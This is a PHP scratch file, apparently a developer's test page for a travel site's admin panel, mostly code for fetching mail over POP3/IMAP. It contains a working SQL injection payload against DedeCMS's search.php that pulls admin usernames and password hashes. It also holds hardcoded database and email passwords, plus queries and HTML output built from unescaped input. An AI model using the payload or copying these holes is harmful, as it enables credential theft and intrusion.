<?php
ini_set('display_errors', '1');
error_reporting(E_ALL);
#set_time_limit(50);
#ob_end_flush();
$a = 'a.1';
$str = strtr($a,array('a'=>'10','.'=>'06','1'=>'50'));
echo $str;
exit;
header('content-type:text/html;charset=gb2312');
var_dump(preg_match('/(^((\(\d{3}\))|(\d{3}\-))?(\(0\d{2,3}\)|0\d{2,3}-)?[1-9]\d{6,7}$)|(^(\+86)?((13)|(15)|(18))\d{9}$)/', '19045617895'));
exit;
echo urldecode("/plus/search.php?keyword=11&typeArr%5B%60@%27%60%20and%28SELECT%2f%2a%2a%2f1%20FROM%28select%2f%2a%2a%2fcount%28%2a%29%2Cconcat%28floor%28rand%280%29%2a2%29%2C%28SELECT%2f%2a%27%27%2a%2fconcat%280x7e%2C0x7e%2C0x7e%2C0x7e%2Cuserid%2C0x3a%2Cpwd%2C0x7e%2C0x7e%2C0x7e%2C0x7e%29%20from%20%23@__admin%20Limit%200%2C1%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%5D=1");
exit;
$str = '版采用重写...1可以设置000i16u2m6x	编辑 	删除 	001b4p3w8tl	编辑 	删除 	003yl1w3wck	编辑 	删除 	00f5hq160kq	编辑 	删除 	00isy2vcn3p	编辑 	删除 	00jk1)k47apd	编辑 	删除 	00qv$be0&3toa	编辑 	删除 	00tisqt9g6a	编辑 	删除 	00tjpy3e2em	编辑 	删除 	00u9y0szhlm	编辑 	删除 	00wyckvaqcx	编辑 	删除 	00ytqeg$mr89	编辑 	删除 	00yunmqrdgl	编辑 	删除 	00zjyf477e9	编辑 	删除 	01800qfsu33	编辑 	删除 	01d5(udw9y6e	编辑 	删除 	01mcg9ml49z	编辑 	删除 	01n9pjr7clz	编辑 	删除 	01nams2cxtb	编辑 	删除 	01o1utqwd0b	编辑 	删除 	01p0xlgsrsz	编辑 	删除 	01qr2vehs6a	编辑 	删除 	01qx6vldz4y	编辑 	删除 	01rj5docfty	编辑 	删除 	01sgeosxn5y	编辑 	删除 	01t6mphi2cy	编辑 	删除 	01tdmyxjvhy	编辑 	删除 	01u4v0m3aoy	编辑 	删除 	01xs9kpfje9	编辑 	删除 	02c9jc1sb2q同af-abc1231时备份多个数据库,选择是否对设定的数据库执行自动备份。2、可以在客户端实现数据库恢复。四、注意:1、本系统在MSSQL Server服务器端运行。本工具...www.cngr.cn/dir/dl0344...html 2013-7-12 - 百度快照自动定时备份sqlserver数据库的方法 - MsSQL教程 - Asp之家指定数据库备份或文件备份应该与上一次完整备份后改变的数据库或文件部分保持一致...sqlserver 临时表 Vs 表变量 详细介绍 sqlserver中在指定数据库的所有表的所有...www.aspxhome.com/database/mssql/2011... 2013-6-1 - 百度快照MSSQL数据库远程备份系统的设计与实现--《湖南科技学院学报》2008...【摘要】:本文设计并实现了一种MSSQL远程备份系统--DBBU。该系统是一个基于...【关键词】: C/S SQLServer 数据库 备份 【分类号】:TP311.138【正文快照】...www.cnki.com.cn/Article/CJFDTotal-JM... 2013-7-19 - 百度快照MSSQL2005数据库备份导入MSSQL2000_SQLServer _数据库专题_文档_...文挡 数据库专题 SQLServer MSSQL2005数据库备份导入MSSQL2000...-- 勾选为所选数据库中的所有对象编写脚本 -- 在接下来的选择脚本选项...www.codesky.net/article/201003/1049... 2013-7-15 - 百度快照';
echo '<pre>';
$arr_str = preg_split('/[^a-zA-Z0-9\\-\\$\\&\\!\\@\\#\\%\\^\\*\\(\\)]+/', $str);
		function mycallback($a){
			if (!$a) {
				return false;
			}
			if (preg_match('/(^\-+$)|(^\d+$)/', $a)) {
				return false;
			}
			if (strlen($a) < 6){
				return false;
			}
			return true;
		};

$arr_str = array_filter($arr_str,'mycallback');
print_r($arr_str);
echo '</pre>';
exit;
mysql_connect('192.168.1.86', 'root', '7778906');
mysql_select_db('test');
$result = mysql_query("select * from test1 where username like binary '%潘%'");
$data = array();
while($rs = mysql_fetch_array($result)) {
	$data[] = $rs;
}
echo '<pre>';
print_r($data);
echo '</pre>';
#date_default_timezone_set('Asia/Shanghai');
#echo ((strtotime(date('Y-m-d H:i:s'))-strtotime('2013-07-31 11:52:00'))/3600);

exit;
class RecursiveFileFilterIterator extends FilterIterator {
    // 满足条件的扩展名
    protected $ext = array('jpg','gif');
 
    /**
     * 提供 $path 并生成对应的目录迭代器
     */
    public function __construct($path) {
        parent::__construct(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path)));
    }
 
    /**
     * 检查文件扩展名是否满足条件
     */
    public function accept() {
        $item = $this->getInnerIterator();
        if ($item->isFile() &&
                in_array(pathinfo($item->getFilename(), PATHINFO_EXTENSION), $this->ext)) {
            return TRUE;
        }
    }
}
 
// 实例化
foreach (new RecursiveFileFilterIterator('/mnt/lwkroot/tff/trunk/images') as $item) {
    echo $item . PHP_EOL;
}


exit;


require 'includes/classes/mail_receive_pop3.php';
require 'includes/classes/mail_receive_imap.php';
require 'includes/classes/mail_parse.php';
require 'includes/classes/mail_get_content_imap.php';
require 'includes/classes/mail_get_content_pop3.php';
/**
 * 从服务器收取邮件类
 * @author lwkai by 2012-09-29 15:23
 *
 */
class admin_get_mail {
	
	/**
	 * 收邮件基类
	 * get_mail_content 的派生类(子类)的实例
	 * @var get_mail_content
	 */
	private $_get_mail = NULL;
	
	/**
	 * 分析邮件类
	 * @var mail_parse
	 */
	private $_mail_parse = NULL;
	
	/**
	 * 存放邮件
	 * @var array
	 */
	private $mail = array();
	
	/**
	 * 当前收邮件的用户ID
	 * @var int
	 */
	private $userid = 0;
	
	/**
	 * 取邮件类  由于邮件有可能是简繁体或者其他文字，
	 * 所以整个类取回来的数据文字编码都是UTF-8，
	 * 读取显示的时候，需要注意。
	 * @param int $userid 当前收邮件的用户ID
	 * @param string $server POP3|IMAP服务器地址
	 * @param string $user 登录用户名  
	 * @param string $pass 登录密码
	 * @param int $port POP3端口 (默认110)
	 * @param int $time_out 超时时间(秒)默认5秒
	 * @param boolean $debug 是否打印出读取邮件的调试信息
	 * @throws Exception 如果参数不会，抛出异常
	 */
	public function __construct($userid,$server, $user, $pass, $port = 110, $time_out = 5, $debug = false){
		if (!empty($userid) && !empty($server) && !empty($user) && !empty($pass)) {
			$this->userid = (int)$userid;
			$domain = substr($server,0,strpos($server, '.'));
			$type = str_replace('ssl://','',$domain);
			if (strtolower($type) == 'imap') {
				// 初始化 IMAP 方式收取邮件类
				$this->get_mail = new mail_get_content_imap($server, $user, $pass, $port, $time_out, $debug);
			} elseif ($type == 'pop3' || $type == 'pop') {
				// 初始化 POP3 方式收取邮件类
				$this->get_mail = new mail_get_content_pop3($server, $user, $pass, $port, $time_out,$debug);
			} else {
				// 非POP3 and IMAP 方式，抛出异常
				throw new Exception('此类只支持IMAP与POP3方式收取邮件！');
			}
		} else {
			// 必传参数缺少，抛出异常
			throw new Exception('必须初始化[POP3|IMAP]地址，用户名，密码和当前用户ID');
		}
	}
	

	/**
	 * 把邮件保存为文件
	 * @param array $mail 邮件内容数组
	 * @param string $filename 文件名[带完整路径]
	 */
	private function save_email_file($mail,$filename){
			$str = join("",$mail);
			file_put_contents($filename, $str);
	}
	
	/**
	 * 查找是否通过其它方式已经收取过同样的邮件
	 * @return boolean
	 */
	private function check_email($subject,$mail_date){
		if (!empty($subject) && !empty($mail_date)) {
			$sql = "select id from utf8_mail where subject='" . $subject . "' and date ='" . $mail_date . "' and admin_id='" . $this->userid . "'";
			$result = tep_db_query($sql);
			if (tep_db_num_rows($result) > 0) {
				return true;
			} else {
				return false;
			}
		}
	}
	
	/**
	 * 获取邮箱邮件序号列表。返回收取多少封邮件
	 * @return int
	 */
	public function get_mail(){
		// 收取邮件 返回收取了多少封
		$num = $this->get_mail->receive();
		$mail_content_arr = $this->get_mail->get_mail();
		$i = 0; //记录本次保存的邮件数
		// 遍历
		foreach($mail_content_arr as $val) {
			// 初始化邮件分析类
			$this->mail_parse = new mail_parse();
			$this->mail_parse->set_mail_content($val['content']);
			$this->mail_parse->format_mail_text();
			$subject = $this->mail_parse->get_subject();
			$mail_date = $this->mail_parse->get_date();
			$filename = $val['name'];
			if (!$this->check_email($subject, $mail_date)) {
				$this->save_email_file($val['content'],email_save_path . $filename . '.eml');
				$this->write_sql($val['content'], $filename . '.eml', $val['identifier']);
				++ $i;
			}
		}
		return $i;	
	}
	
	/**
	 * 把邮件保存为文件，并且把一些主要信息保存到数据库中
	 * @param array $mail_content  邮件正文内容
	 * @param string $filename 保存的文件名
	 * @param string $identifier 邮件的唯一标识符
	 */
	private function write_sql($mail_content, $filename, $identifier){
		if (is_array($mail_content)){
			/**
			 * @var mail_parse
			 */
			
			
			//$mail_parse->test();

			$subject = $this->mail_parse->get_subject();
			$from_name = $this->mail_parse->get_from();
			$from_address = (empty($from_name) ? '' : join(',', array_keys($from_name)));
			$from_name = (empty($from_name) ? '' : join(',', $from_name));
			$from_address = (empty($from_address) ? $from_name : $from_address);
			$mail_date = $this->mail_parse->get_date();
			$to_name = $this->mail_parse->get_to() ;
			$to_address = (empty($to_name) ? '' : join(',', $to_name));
			$to_name = (empty($to_name) ? '' : join(',', array_keys($to_name)));
			$to_address = (empty($to_address) ? $to_name : $to_address);
			$copy_to_name = $this->mail_parse->get_cc() ;
			$copy_to_address = (empty($copy_to_name) ? '' : join(',', array_keys($copy_to_name)));
			$copy_to_name = (empty($copy_to_name) ? '' : join(',', $copy_to_name));
			$copy_to_address = (empty($copy_to_address) ? $copy_to_name : $copy_to_address);
			
			$data = array(
				'num' => 0,
				'identifier'      => $identifier,
				'from_name'       => $from_name,
				'from_address'    => $from_address,
				'date'            => $mail_date,
				'subject'         => $subject,
				'filename'        => $filename,
				'admin_id'        => $this->userid,
				'to_name'         => $to_name,
				'to_address'      => $to_address,
				'copy_to_name'    => $copy_to_name,
				'copy_to_address' => $copy_to_address
			);
			tep_db_perform('utf8_mail', $data);
		}
	}
}

$servers = array(
	'qq.com' => array(
		'imap' => array(
			'server' => 'imap.qq.com',
			'port'   => '143'
		),
		'pop3' => array(
			'server' => 'pop.qq.com',
			'port'   => '110'
		),
		'smtp' => array(
			'server' => 'smtp.qq.com',
			'port'   => '25'
		)
	),
	'gmail.com' => array(
		'pop3' => array(
			'server' => 'ssl://pop.gmail.com',
			'port'   => '995'),
		'imap' => array(
			'server' => 'ssl://imap.gmail.com',
			'port'   => '993'
		),
		'smtp' => array(
			'server' => 'ssl://smtp.gmail.com',
			'port'   => '465'
		)
	),
	'hotmail.com' => array(
		'pop3' => array(
			'server' => 'ssl://pop3.live.com',
			'port'   => '995'
		),
		'imap' => array(
			'server' => '',
			'port'   => ''
		),
		'smtp' => array(
			'server' => 'ssl://smtp.live.com',
			'port'   => '25'
		)
	),
	'tom.com' => array(
		'pop3' => array(
			'server' => 'pop.tom.com',
			'port'   => '110'
		)
	)
);

define('email_save_path','/var/www/html/888trip.com/wwwroot/admin/email/');
$type = isset($_GET['type']) ? $_GET['type'] : 'pop3';
$user = array();
$user['246'] = array(
	'service'=>$servers['qq.com'][$type]['server'],
	'user'=>'2683692314',
	'pass'=>'usitrip2012',
	'port'=>$servers['qq.com'][$type]['port']
);
$user['247'] = array(
	'service'=>$servers['gmail.com']['imap']['server'],
	'user'=>'li1275124829@gmail.com',
	'pass'=>'19821104',
	'port'=>$servers['gmail.com']['imap']['port']
);

$user['19'] = array('service'=>'pop.tom.com','user'=>'usitrip123456789@tom.com','pass'=>'88888888','port'=>'110');



$userid = 246;
$_GET['action'] = (isset($_GET['action']) ? $_GET['action'] : '');

switch($_GET['action']){
	case 'show':
		header("Content-type: text/html; charset=utf-8");
		echo '<table border=1>';
		echo '<tr><td>id</td><td>num</td><td>admin_id</td><td>filename</td><td>From</td><td>subject</td><td>FromAddress</td><td>To</td><td>ToAddress</TD><TD>cc</TD><TD>ccAddress</td></tr>';
		$result = tep_db_query("select * from utf8_mail where admin_id=" . $userid . " order by id desc");
		while ($row = tep_db_fetch_array($result)) {
		
			echo '<tr><td>' . $row['id'] . '<td>' . $row['num'] . '</td><td>' . $row['admin_id'] . '<td><a href="test_parse_mail.php?i=' . $row['filename'] . '" target="_blank">' . $row['filename'] . '</a><td>&nbsp;' . $row['from_name'] .
			'</td><td>&nbsp;' . $row['subject'] .
			'</td><td>&nbsp;' . $row['from_address'] .
			'</td><td>&nbsp;' . $row['to_name'] .
			'</td><td>&nbsp;' . $row['to_address'] .
			'</td><td>&nbsp;' . $row['copy_to_name'] .
			'</td><td>&nbsp;' . $row['copy_to_address'] .
			
			'</td></tr>' ;
		
		}
		echo '</table>';
		break;
	default:

		try{
			//header('Content-Type:text/html;charset=utf8');

			$mail = new admin_get_mail($userid,$user[$userid]['service'],$user[$userid]['user'], $user[$userid]['pass'],$user[$userid]['port'],5,false);
						
			//$mail->set_ssl(true);
			$num = $count_num = $mail->get_mail();
			echo 'receive ' . $count_num . '';
		}catch(Exception $e) {
			print_r($e);
		}
		break;
}


/*
*/
//$mail->save_all_mail();
//echo '<br/>';
//print_r($mail_list);

#require_once 'includes/classes/send_mail_ready.php';
#require_once 'includes/classes/companion_mail.php';
#require_once 'includes/classes/companion_under_order_mail.php';

#require_once 'smtp_send_email.php';
//require_once 'includes/classes/reply_companion_mail.php';
//require_once 'includes/classes/application_companion_mail.php';
//require_once 'includes/classes/result_application_companion_mail.php';
#unset($_SESSION['need_send_email']);
#new companion_under_order_mail('2683692314@qq.com', 50295);
//new reply_companion_mail(7042,60031,2696);
//new application_companion_mail(7042,60031,21);
//new result_application_companion_mail(10, 'canceled');
#print_r($_SESSION['need_send_email']);
#unset($_SESSION['need_send_email']);
#exit();

?>